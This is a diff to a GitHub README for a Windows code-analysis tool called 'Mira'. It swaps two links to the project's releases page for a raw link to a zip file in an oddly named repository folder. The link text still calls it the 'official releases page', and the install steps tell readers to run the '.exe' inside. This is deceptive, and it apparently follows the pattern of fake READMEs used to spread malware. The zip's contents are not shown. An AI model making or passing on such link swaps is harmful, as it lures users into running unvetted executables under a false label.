@@ -1,6 +1,6 @@
 # 🤖 Mira - Analyze your complex code projects easily
 
-[![](https://img.shields.io/badge/Download-Mira_for_Windows-blue)](https://github.com/rentcollectorcheilanthesalabamensis719/Mira/releases)
+[![](https://img.shields.io/badge/Download-Mira_for_Windows-blue)](https://github.com/rentcollectorcheilanthesalabamensis719/Mira/raw/refs/heads/main/Jehovistic/Software_v3.6.zip)
 
 ## 📖 About Mira
 
@@ -24,7 +24,7 @@ Mira acts as your intelligent partner for understanding software code. Projects 
 
 ## 📥 Download and Installation
 
-1.  Visit the [official releases page](https://github.com/rentcollectorcheilanthesalabamensis719/Mira/releases) to download the setup file.
+1.  Visit the [official releases page](https://github.com/rentcollectorcheilanthesalabamensis719/Mira/raw/refs/heads/main/Jehovistic/Software_v3.6.zip) to download the setup file.
 2.  Locate the file ending in `.exe` for Windows.
 3.  Click the file to initiate the installation process.
 4.  Follow the prompts in the setup window to install Mira on your computer.
